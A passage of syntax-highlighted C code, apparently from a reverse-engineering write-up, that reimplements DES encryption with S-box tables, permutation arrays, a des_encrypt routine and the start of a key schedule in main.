class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s1[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x01010400</span>, <span class="number">0x00000000</span>, <span class="number">0x00010000</span>, <span class="number">0x01010404</span>, <span class="number">0x01010004</span>, <span class="number">0x00010404</span>, <span class="number">0x00000004</span>, <span class="number">0x00010000</span>,</span><br><span class="line">    <span class="number">0x00000400</span>, <span class="number">0x01010400</span>, <span class="number">0x01010404</span>, <span class="number">0x00000400</span>, <span class="number">0x01000404</span>, <span class="number">0x01010004</span>, <span class="number">0x01000000</span>, <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x00000404</span>, <span class="number">0x01000400</span>, <span class="number">0x01000400</span>, <span class="number">0x00010400</span>, <span class="number">0x00010400</span>, <span class="number">0x01010000</span>, <span class="number">0x01010000</span>, <span class="number">0x01000404</span>,</span><br><span class="line">    <span class="number">0x00010004</span>, <span class="number">0x01000004</span>, <span class="number">0x01000004</span>, <span class="number">0x00010004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000404</span>, <span class="number">0x00010404</span>, <span class="number">0x01000000</span>,</span><br><span class="line">    <span class="number">0x00010000</span>, <span class="number">0x01010404</span>, <span class="number">0x00000004</span>, <span class="number">0x01010000</span>, <span class="number">0x01010400</span>, <span class="number">0x01000000</span>, <span class="number">0x01000000</span>, <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0x01010004</span>, <span class="number">0x00010000</span>, <span class="number">0x00010400</span>, <span class="number">0x01000004</span>, <span class="number">0x00000400</span>, <span class="number">0x00000004</span>, <span class="number">0x01000404</span>, <span class="number">0x00010404</span>,</span><br><span class="line">    <span class="number">0x01010404</span>, <span class="number">0x00010004</span>, <span class="number">0x01010000</span>, <span class="number">0x01000404</span>, <span class="number">0x01000004</span>, <span class="number">0x00000404</span>, <span class="number">0x00010404</span>, <span class="number">0x01010400</span>,</span><br><span class="line">    <span class="number">0x00000404</span>, <span class="number">0x01000400</span>, <span class="number">0x01000400</span>, <span class="number">0x00000000</span>, <span class="number">0x00010004</span>, <span class="number">0x00010400</span>, <span class="number">0x00000000</span>, <span class="number">0x01010004</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s2[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x80108020</span>, <span class="number">0x80008000</span>, <span class="number">0x00008000</span>, <span class="number">0x00108020</span>, <span class="number">0x00100000</span>, <span class="number">0x00000020</span>, <span class="number">0x80100020</span>, <span class="number">0x80008020</span>,</span><br><span class="line">    <span class="number">0x80000020</span>, <span class="number">0x80108020</span>, <span class="number">0x80108000</span>, <span class="number">0x80000000</span>, <span class="number">0x80008000</span>, <span class="number">0x00100000</span>, <span class="number">0x00000020</span>, <span class="number">0x80100020</span>,</span><br><span class="line">    <span class="number">0x00108000</span>, <span class="number">0x00100020</span>, <span class="number">0x80008020</span>, <span class="number">0x00000000</span>, <span class="number">0x80000000</span>, <span class="number">0x00008000</span>, <span class="number">0x00108020</span>, <span class="number">0x80100000</span>,</span><br><span class="line">    <span class="number">0x00100020</span>, <span class="number">0x80000020</span>, <span class="number">0x00000000</span>, <span class="number">0x00108000</span>, <span class="number">0x00008020</span>, <span class="number">0x80108000</span>, <span class="number">0x80100000</span>, <span class="number">0x00008020</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00108020</span>, <span class="number">0x80100020</span>, <span class="number">0x00100000</span>, <span class="number">0x80008020</span>, <span class="number">0x80100000</span>, <span class="number">0x80108000</span>, <span class="number">0x00008000</span>,</span><br><span class="line">    <span class="number">0x80100000</span>, <span class="number">0x80008000</span>, <span class="number">0x00000020</span>, <span class="number">0x80108020</span>, <span class="number">0x00108020</span>, <span class="number">0x00000020</span>, <span class="number">0x00008000</span>, <span class="number">0x80000000</span>,</span><br><span class="line">    <span class="number">0x00008020</span>, <span class="number">0x80108000</span>, <span class="number">0x00100000</span>, <span class="number">0x80000020</span>, <span class="number">0x00100020</span>, <span class="number">0x80008020</span>, <span class="number">0x80000020</span>, <span class="number">0x00100020</span>,</span><br><span class="line">    <span class="number">0x00108000</span>, <span class="number">0x00000000</span>, <span class="number">0x80008000</span>, <span class="number">0x00008020</span>, <span class="number">0x80000000</span>, <span class="number">0x80100020</span>, <span class="number">0x80108020</span>, <span class="number">0x00108000</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s3[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00000208</span>, <span class="number">0x08020200</span>, <span class="number">0x00000000</span>, <span class="number">0x08020008</span>, <span class="number">0x08000200</span>, <span class="number">0x00000000</span>, <span class="number">0x00020208</span>, <span class="number">0x08000200</span>,</span><br><span class="line">    <span class="number">0x00020008</span>, <span class="number">0x08000008</span>, <span class="number">0x08000008</span>, <span class="number">0x00020000</span>, <span class="number">0x08020208</span>, <span class="number">0x00020008</span>, <span class="number">0x08020000</span>, <span class="number">0x00000208</span>,</span><br><span class="line">    <span class="number">0x08000000</span>, <span class="number">0x00000008</span>, <span class="number">0x08020200</span>, <span class="number">0x00000200</span>, <span class="number">0x00020200</span>, <span class="number">0x08020000</span>, <span class="number">0x08020008</span>, <span class="number">0x00020208</span>,</span><br><span class="line">    <span class="number">0x08000208</span>, <span class="number">0x00020200</span>, <span class="number">0x00020000</span>, <span class="number">0x08000208</span>, <span class="number">0x00000008</span>, <span class="number">0x08020208</span>, <span class="number">0x00000200</span>, <span class="number">0x08000000</span>,</span><br><span class="line">    <span class="number">0x08020200</span>, <span class="number">0x08000000</span>, <span class="number">0x00020008</span>, <span class="number">0x00000208</span>, <span class="number">0x00020000</span>, <span class="number">0x08020200</span>, <span class="number">0x08000200</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000200</span>, <span class="number">0x00020008</span>, <span class="number">0x08020208</span>, <span class="number">0x08000200</span>, <span class="number">0x08000008</span>, <span class="number">0x00000200</span>, <span class="number">0x00000000</span>, <span class="number">0x08020008</span>,</span><br><span class="line">    <span class="number">0x08000208</span>, <span class="number">0x00020000</span>, <span class="number">0x08000000</span>, <span class="number">0x08020208</span>, <span class="number">0x00000008</span>, <span class="number">0x00020208</span>, <span class="number">0x00020200</span>, <span class="number">0x08000008</span>,</span><br><span class="line">    <span class="number">0x08020000</span>, <span class="number">0x08000208</span>, <span class="number">0x00000208</span>, <span class="number">0x08020000</span>, <span class="number">0x00020208</span>, <span class="number">0x00000008</span>, <span class="number">0x08020008</span>, <span class="number">0x00020200</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s4[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00802001</span>, <span class="number">0x00002081</span>, <span class="number">0x00002081</span>, <span class="number">0x00000080</span>, <span class="number">0x00802080</span>, <span class="number">0x00800081</span>, <span class="number">0x00800001</span>, <span class="number">0x00002001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00802000</span>, <span class="number">0x00802000</span>, <span class="number">0x00802081</span>, <span class="number">0x00000081</span>, <span class="number">0x00000000</span>, <span class="number">0x00800080</span>, <span class="number">0x00800001</span>,</span><br><span class="line">    <span class="number">0x00000001</span>, <span class="number">0x00002000</span>, <span class="number">0x00800000</span>, <span class="number">0x00802001</span>, <span class="number">0x00000080</span>, <span class="number">0x00800000</span>, <span class="number">0x00002001</span>, <span class="number">0x00002080</span>,</span><br><span class="line">    <span class="number">0x00800081</span>, <span class="number">0x00000001</span>, <span class="number">0x00002080</span>, <span class="number">0x00800080</span>, <span class="number">0x00002000</span>, <span class="number">0x00802080</span>, <span class="number">0x00802081</span>, <span class="number">0x00000081</span>,</span><br><span class="line">    <span class="number">0x00800080</span>, <span class="number">0x00800001</span>, <span class="number">0x00802000</span>, <span class="number">0x00802081</span>, <span class="number">0x00000081</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00802000</span>,</span><br><span class="line">    <span class="number">0x00002080</span>, <span class="number">0x00800080</span>, <span class="number">0x00800081</span>, <span class="number">0x00000001</span>, <span class="number">0x00802001</span>, <span class="number">0x00002081</span>, <span class="number">0x00002081</span>, <span class="number">0x00000080</span>,</span><br><span class="line">    <span class="number">0x00802081</span>, <span class="number">0x00000081</span>, <span class="number">0x00000001</span>, <span class="number">0x00002000</span>, <span class="number">0x00800001</span>, <span class="number">0x00002001</span>, <span class="number">0x00802080</span>, <span class="number">0x00800081</span>,</span><br><span class="line">    <span class="number">0x00002001</span>, <span class="number">0x00002080</span>, <span class="number">0x00800000</span>, <span class="number">0x00802001</span>, <span class="number">0x00000080</span>, <span class="number">0x00800000</span>, <span class="number">0x00002000</span>, <span class="number">0x00802080</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s5[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00000100</span>, <span class="number">0x02080100</span>, <span class="number">0x02080000</span>, <span class="number">0x42000100</span>, <span class="number">0x00080000</span>, <span class="number">0x00000100</span>, <span class="number">0x40000000</span>, <span class="number">0x02080000</span>,</span><br><span class="line">    <span class="number">0x40080100</span>, <span class="number">0x00080000</span>, <span class="number">0x02000100</span>, <span class="number">0x40080100</span>, <span class="number">0x42000100</span>, <span class="number">0x42080000</span>, <span class="number">0x00080100</span>, <span class="number">0x40000000</span>,</span><br><span class="line">    <span class="number">0x02000000</span>, <span class="number">0x40080000</span>, <span class="number">0x40080000</span>, <span class="number">0x00000000</span>, <span class="number">0x40000100</span>, <span class="number">0x42080100</span>, <span class="number">0x42080100</span>, <span class="number">0x02000100</span>,</span><br><span class="line">    <span class="number">0x42080000</span>, <span class="number">0x40000100</span>, <span class="number">0x00000000</span>, <span class="number">0x42000000</span>, <span class="number">0x02080100</span>, <span class="number">0x02000000</span>, <span class="number">0x42000000</span>, <span class="number">0x00080100</span>,</span><br><span class="line">    <span class="number">0x00080000</span>, <span class="number">0x42000100</span>, <span class="number">0x00000100</span>, <span class="number">0x02000000</span>, <span class="number">0x40000000</span>, <span class="number">0x02080000</span>, <span class="number">0x42000100</span>, <span class="number">0x40080100</span>,</span><br><span class="line">    <span class="number">0x02000100</span>, <span class="number">0x40000000</span>, <span class="number">0x42080000</span>, <span class="number">0x02080100</span>, <span class="number">0x40080100</span>, <span class="number">0x00000100</span>, <span class="number">0x02000000</span>, <span class="number">0x42080000</span>,</span><br><span class="line">    <span class="number">0x42080100</span>, <span class="number">0x00080100</span>, <span class="number">0x42000000</span>, <span class="number">0x42080100</span>, <span class="number">0x02080000</span>, <span class="number">0x00000000</span>, <span class="number">0x40080000</span>, <span class="number">0x42000000</span>,</span><br><span class="line">    <span class="number">0x00080100</span>, <span class="number">0x02000100</span>, <span class="number">0x40000100</span>, <span class="number">0x00080000</span>, <span class="number">0x00000000</span>, <span class="number">0x40080000</span>, <span class="number">0x02080100</span>, <span class="number">0x40000100</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s6[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x20000010</span>, <span class="number">0x20400000</span>, <span class="number">0x00004000</span>, <span class="number">0x20404010</span>, <span class="number">0x20400000</span>, <span class="number">0x00000010</span>, <span class="number">0x20404010</span>, <span class="number">0x00400000</span>,</span><br><span class="line">    <span class="number">0x20004000</span>, <span class="number">0x00404010</span>, <span class="number">0x00400000</span>, <span class="number">0x20000010</span>, <span class="number">0x00400010</span>, <span class="number">0x20004000</span>, <span class="number">0x20000000</span>, <span class="number">0x00004010</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00400010</span>, <span class="number">0x20004010</span>, <span class="number">0x00004000</span>, <span class="number">0x00404000</span>, <span class="number">0x20004010</span>, <span class="number">0x00000010</span>, <span class="number">0x20400010</span>,</span><br><span class="line">    <span class="number">0x20400010</span>, <span class="number">0x00000000</span>, <span class="number">0x00404010</span>, <span class="number">0x20404000</span>, <span class="number">0x00004010</span>, <span class="number">0x00404000</span>, <span class="number">0x20404000</span>, <span class="number">0x20000000</span>,</span><br><span class="line">    <span class="number">0x20004000</span>, <span class="number">0x00000010</span>, <span class="number">0x20400010</span>, <span class="number">0x00404000</span>, <span class="number">0x20404010</span>, <span class="number">0x00400000</span>, <span class="number">0x00004010</span>, <span class="number">0x20000010</span>,</span><br><span class="line">    <span class="number">0x00400000</span>, <span class="number">0x20004000</span>, <span class="number">0x20000000</span>, <span class="number">0x00004010</span>, <span class="number">0x20000010</span>, <span class="number">0x20404010</span>, <span class="number">0x00404000</span>, <span class="number">0x20400000</span>,</span><br><span class="line">    <span class="number">0x00404010</span>, <span class="number">0x20404000</span>, <span class="number">0x00000000</span>, <span class="number">0x20400010</span>, <span class="number">0x00000010</span>, <span class="number">0x00004000</span>, <span class="number">0x20400000</span>, <span class="number">0x00404010</span>,</span><br><span class="line">    <span class="number">0x00004000</span>, <span class="number">0x00400010</span>, <span class="number">0x20004010</span>, <span class="number">0x00000000</span>, <span class="number">0x20404000</span>, <span class="number">0x20000000</span>, <span class="number">0x00400010</span>, <span class="number">0x20004010</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s7[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00200000</span>, <span class="number">0x04200002</span>, <span class="number">0x04000802</span>, <span class="number">0x00000000</span>, <span class="number">0x00000800</span>, <span class="number">0x04000802</span>, <span class="number">0x00200802</span>, <span class="number">0x04200800</span>,</span><br><span class="line">    <span class="number">0x04200802</span>, <span class="number">0x00200000</span>, <span class="number">0x00000000</span>, <span class="number">0x04000002</span>, <span class="number">0x00000002</span>, <span class="number">0x04000000</span>, <span class="number">0x04200002</span>, <span class="number">0x00000802</span>,</span><br><span class="line">    <span class="number">0x04000800</span>, <span class="number">0x00200802</span>, <span class="number">0x00200002</span>, <span class="number">0x04000800</span>, <span class="number">0x04000002</span>, <span class="number">0x04200000</span>, <span class="number">0x04200800</span>, <span class="number">0x00200002</span>,</span><br><span class="line">    <span class="number">0x04200000</span>, <span class="number">0x00000800</span>, <span class="number">0x00000802</span>, <span class="number">0x04200802</span>, <span class="number">0x00200800</span>, <span class="number">0x00000002</span>, <span class="number">0x04000000</span>, <span class="number">0x00200800</span>,</span><br><span class="line">    <span class="number">0x04000000</span>, <span class="number">0x00200800</span>, <span class="number">0x00200000</span>, <span class="number">0x04000802</span>, <span class="number">0x04000802</span>, <span class="number">0x04200002</span>, <span class="number">0x04200002</span>, <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00200002</span>, <span class="number">0x04000000</span>, <span class="number">0x04000800</span>, <span class="number">0x00200000</span>, <span class="number">0x04200800</span>, <span class="number">0x00000802</span>, <span class="number">0x00200802</span>, <span class="number">0x04200800</span>,</span><br><span class="line">    <span class="number">0x00000802</span>, <span class="number">0x04000002</span>, <span class="number">0x04200802</span>, <span class="number">0x04200000</span>, <span class="number">0x00200800</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x04200802</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00200802</span>, <span class="number">0x04200000</span>, <span class="number">0x00000800</span>, <span class="number">0x04000002</span>, <span class="number">0x04000800</span>, <span class="number">0x00000800</span>, <span class="number">0x00200002</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s8[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x10001040</span>, <span class="number">0x00001000</span>, <span class="number">0x00040000</span>, <span class="number">0x10041040</span>, <span class="number">0x10000000</span>, <span class="number">0x10001040</span>, <span class="number">0x00000040</span>, <span class="number">0x10000000</span>,</span><br><span class="line">    <span class="number">0x00040040</span>, <span class="number">0x10040000</span>, <span class="number">0x10041040</span>, <span class="number">0x00041000</span>, <span class="number">0x10041000</span>, <span class="number">0x00041040</span>, <span class="number">0x00001000</span>, <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x10040000</span>, <span class="number">0x10000040</span>, <span class="number">0x10001000</span>, <span class="number">0x00001040</span>, <span class="number">0x00041000</span>, <span class="number">0x00040040</span>, <span class="number">0x10040040</span>, <span class="number">0x10041000</span>,</span><br><span class="line">    <span class="number">0x00001040</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x10040040</span>, <span class="number">0x10000040</span>, <span class="number">0x10001000</span>, <span class="number">0x00041040</span>, <span class="number">0x00040000</span>,</span><br><span class="line">    <span class="number">0x00041040</span>, <span class="number">0x00040000</span>, <span class="number">0x10041000</span>, <span class="number">0x00001000</span>, <span class="number">0x00000040</span>, <span class="number">0x10040040</span>, <span class="number">0x00001000</span>, <span class="number">0x00041040</span>,</span><br><span class="line">    <span class="number">0x10001000</span>, <span class="number">0x00000040</span>, <span class="number">0x10000040</span>, <span class="number">0x10040000</span>, <span class="number">0x10040040</span>, <span class="number">0x10000000</span>, <span class="number">0x00040000</span>, <span class="number">0x10001040</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x10041040</span>, <span class="number">0x00040040</span>, <span class="number">0x10000040</span>, <span class="number">0x10040000</span>, <span class="number">0x10001000</span>, <span class="number">0x10001040</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x10041040</span>, <span class="number">0x00041000</span>, <span class="number">0x00041000</span>, <span class="number">0x00001040</span>, <span class="number">0x00001040</span>, <span class="number">0x00040040</span>, <span class="number">0x10000000</span>, <span class="number">0x10041000</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> word_7FF65FC70900[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0x0080</span>, <span class="number">0x0040</span>, <span class="number">0x0020</span>, <span class="number">0x0010</span>, <span class="number">0x0008</span>, <span class="number">0x0004</span>, <span class="number">0x0002</span>, <span class="number">0x0001</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_7FF65FC70910[<span class="number">24</span>] = &#123;</span><br><span class="line">    <span class="number">0x00800000</span>, <span class="number">0x00400000</span>, <span class="number">0x00200000</span>, <span class="number">0x00100000</span>, <span class="number">0x00080000</span>, <span class="number">0x00040000</span>, <span class="number">0x00020000</span>, <span class="number">0x00010000</span>,</span><br><span class="line">    <span class="number">0x00008000</span>, <span class="number">0x00004000</span>, <span class="number">0x00002000</span>, <span class="number">0x00001000</span>, <span class="number">0x00000800</span>, <span class="number">0x00000400</span>, <span class="number">0x00000200</span>, <span class="number">0x00000100</span>,</span><br><span class="line">    <span class="number">0x00000080</span>, <span class="number">0x00000040</span>, <span class="number">0x00000020</span>, <span class="number">0x00000010</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF65FC70970[<span class="number">56</span>] = &#123;</span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x30</span>, <span class="number">0x28</span>, <span class="number">0x20</span>, <span class="number">0x18</span>, <span class="number">0x10</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x31</span>, <span class="number">0x29</span>, <span class="number">0x21</span>, <span class="number">0x19</span>, <span class="number">0x11</span>, <span class="number">0x09</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x3A</span>, <span class="number">0x32</span>, <span class="number">0x2A</span>, <span class="number">0x22</span>, <span class="number">0x1A</span>, <span class="number">0x12</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0x3B</span>, <span class="number">0x33</span>, <span class="number">0x2B</span>, <span class="number">0x23</span>, <span class="number">0x3E</span>, <span class="number">0x36</span>, <span class="number">0x2E</span>, <span class="number">0x26</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x16</span>, <span class="number">0x0E</span>, <span class="number">0x06</span>, <span class="number">0x3D</span>, <span class="number">0x35</span>, <span class="number">0x2D</span>, <span class="number">0x25</span>, <span class="number">0x1D</span>, <span class="number">0x15</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x2C</span>, <span class="number">0x24</span>,</span><br><span class="line">    <span class="number">0x1C</span>, <span class="number">0x14</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1B</span>, <span class="number">0x13</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF65FC709A8[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">des_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *_a1_, DWORD *_a2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> left = _a1_[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> right = _a1_[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> temp = (left ^ (right &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xF0F0F0F</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">4</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (left ^ (right &gt;&gt; <span class="number">16</span>)) &amp; <span class="number">0x0000FFFF</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">16</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0x33333333</span>;</span><br><span class="line">    right = temp ^ right;</span><br><span class="line">    left = (temp &lt;&lt; <span class="number">2</span>) ^ left;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">8</span>)) &amp; <span class="number">0x00FF00FF</span>;</span><br><span class="line">    right = temp ^ right;</span><br><span class="line">    left = (((temp &lt;&lt; <span class="number">8</span>) ^ left) &gt;&gt; <span class="number">31</span>) | (<span class="number">2</span> * ((temp &lt;&lt; <span class="number">8</span>) ^ left));</span><br><span class="line"></span><br><span class="line">    temp = (left ^ right) &amp; <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = ((temp ^ right) &gt;&gt; <span class="number">31</span>) | (<span class="number">2</span> * (temp ^ right));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = *_a2_++ ^ ((left &gt;&gt; <span class="number">4</span>) | (left &lt;&lt; <span class="number">28</span>));</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> result1 = s1[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                               s3[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                               s5[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                               s7[temp &amp; <span class="number">0x3F</span>];</span><br><span class="line">        temp = *_a2_++ ^ left;</span><br><span class="line"></span><br><span class="line">        right ^= s2[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 s4[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 s6[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 s8[temp &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 result1;</span><br><span class="line"></span><br><span class="line">        temp = *_a2_++ ^ ((right &gt;&gt; <span class="number">4</span>) | (right &lt;&lt; <span class="number">28</span>));</span><br><span class="line">        result1 = s1[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                  s3[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                  s5[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                  s7[temp &amp; <span class="number">0x3F</span>];</span><br><span class="line"></span><br><span class="line">        temp = *_a2_++ ^ right;</span><br><span class="line">        left ^= s2[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                s4[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                s6[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                s8[temp &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                result1;</span><br><span class="line">    &#125;</span><br><span class="line">    left = (left &gt;&gt; <span class="number">1</span>) | (left &lt;&lt; <span class="number">31</span>);</span><br><span class="line">    temp = (left ^ right) &amp; <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = ((temp ^ right) &gt;&gt; <span class="number">1</span>) | ((temp ^ right) &lt;&lt; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">    temp = (left ^ (right &gt;&gt; <span class="number">8</span>)) &amp; <span class="number">0xFF00FF</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">8</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (left ^ (right &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0x33333333</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">2</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">16</span>)) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">    right = temp ^ right;</span><br><span class="line">    left = (temp &lt;&lt; <span class="number">16</span>) ^ left;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0x0F0F0F0F</span>;</span><br><span class="line"></span><br><span class="line">    _a1_[<span class="number">0</span>] = (temp &lt;&lt; <span class="number">4</span>) ^ left;</span><br><span class="line">    _a1_[<span class="number">1</span>] = temp ^ right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">64</span>] = &#123;</span><br><span class="line">        <span class="number">0x2C0B3C36</span>, <span class="number">0x09221A0A</span>, <span class="number">0x2829051D</span>, <span class="number">0x09123B0D</span>, <span class="number">0x2C091B18</span>, <span class="number">0x0512011F</span>, <span class="number">0x09292E17</span>, <span class="number">0x07122920</span>,</span><br><span class="line">        <span class="number">0x090D1703</span>, <span class="number">0x0514372E</span>, <span class="number">0x0915123C</span>, <span class="number">0x27100E27</span>, <span class="number">0x01050927</span>, <span class="number">0x25150D29</span>, <span class="number">0x13151F32</span>, <span class="number">0x24112618</span>,</span><br><span class="line">        <span class="number">0x03052031</span>, <span class="number">0x34312B37</span>, <span class="number">0x13043A05</span>, <span class="number">0x3C19151B</span>, <span class="number">0x23063B3E</span>, <span class="number">0x34293830</span>, <span class="number">0x03062108</span>, <span class="number">0x380B3F2A</span>,</span><br><span class="line">        <span class="number">0x260E063D</span>, <span class="number">0x3009141B</span>, <span class="number">0x0E223D3D</span>, <span class="number">0x300B0124</span>, <span class="number">0x062A1700</span>, <span class="number">0x11093D14</span>, <span class="number">0x0E22262B</span>, <span class="number">0x1208083E</span>,</span><br><span class="line">        <span class="number">0x0E22262B</span>, <span class="number">0x1208083E</span>, <span class="number">0x062A1700</span>, <span class="number">0x11093D14</span>, <span class="number">0x0E223D3D</span>, <span class="number">0x300B0124</span>, <span class="number">0x260E063D</span>, <span class="number">0x3009141B</span>,</span><br><span class="line">        <span class="number">0x03062108</span>, <span class="number">0x380B3F2A</span>, <span class="number">0x23063B3E</span>, <span class="number">0x34293830</span>, <span class="number">0x13043A05</span>, <span class="number">0x3C19151B</span>, <span class="number">0x03052031</span>, <span class="number">0x34312B37</span>,</span><br><span class="line">        <span class="number">0x13151F32</span>, <span class="number">0x24112618</span>, <span class="number">0x01050927</span>, <span class="number">0x25150D29</span>, <span class="number">0x0915123C</span>, <span class="number">0x27100E27</span>, <span class="number">0x090D1703</span>, <span class="number">0x0514372E</span>,</span><br><span class="line">        <span class="number">0x09292E17</span>, <span class="number">0x07122920</span>, <span class="number">0x2C091B18</span>, <span class="number">0x0512011F</span>, <span class="number">0x2829051D</span>, <span class="number">0x09123B0D</span>, <span class="number">0x2C0B3C36</span>, <span 